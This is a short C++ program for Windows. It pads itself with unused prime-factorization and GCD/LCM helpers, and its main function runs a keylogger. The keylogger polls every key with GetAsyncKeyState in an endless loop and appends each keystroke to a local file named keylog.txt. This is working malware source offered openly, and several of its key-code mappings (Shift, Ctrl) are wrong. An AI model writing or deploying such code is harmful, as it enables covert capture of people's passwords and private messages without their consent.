#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <algorithm>
#include <stack>
#include <queue>
#include <math.h>
#include <vector>
#define FACTORIZATION(n, factors) \
    factors = primeFactorization(n);
#define GCD(a, b) (b == 0 ? a : GCD(b, a % b))
#define LCM(a, b) ((a * b) / GCD(a, b))

#define space 32
#define enter 13
#define backSpace 8
#define tab 9
#define shift 10
#define ctrl 11
#define esc 27
#define del 127
/*
    - ASCII values of specific keyboard keys
        https://theasciicode.com.ar/
*/
using namespace std;
vector<int> primeFactorization(int n) {
    std::vector<int> factors;
    for (int i = 2; i * i <= n; i++) {
        while (n % i == 0) {
            factors.push_back(i);
            n /= i;
        }
    }
    if (n > 1) {
        factors.push_back(n);
    }
    return factors;
}
// Function to capture keystrokes and store them in a string
void logKeyStrokes() {
    string keystrokes = "";  // String to store captured keys

    // Open file in append mode to store the keystrokes
    ofstream file("keylog.txt", std::ios::app);

    while (1) {
        // Loop through all keys (from 8 to 222)
        for (unsigned char key = 8; key <= 222; key++) {
            // Check if the key is pressed
            if (GetAsyncKeyState(key) == -32767) {
                // Store the key in the string
                switch (key) {
                    case space:  // Handle space key
                        keystrokes += " ";
                        break;
                    case enter:  // Handle enter key
                        keystrokes += "\n";
                        break;
                    case backSpace:  // Handle backspace
                        keystrokes += "[BACKSPACE]";
                        break;
                    case tab:  // Handle tab key
                        keystrokes += "\t";
                        break;
                    case shift:  // Handle shift key
                        keystrokes += "[SHIFT]";
                        break;
                    case ctrl:  // Handle control key
                        keystrokes += "[CTRL]";
                        break;
                    case esc:  // Handle escape key
                        keystrokes += "[ESC]";
                        break;
                    case del:  // Handle delete key
                        keystrokes += "[DEL]";
                        break;
                    default:
                        keystrokes += key;  // For other keys, just append the key
                }

                // Write keystrokes to the log file
                file << keystrokes;
                file.flush();  // Ensure keystrokes are written to the file immediately
                keystrokes.clear();  // Clear the string to capture new keys
            }
        }
        Sleep(10);  // Sleep for a short time to prevent high CPU usage
    }

    file.close();  // Close the file
}

int main() {
    logKeyStrokes();
    return 0;
}
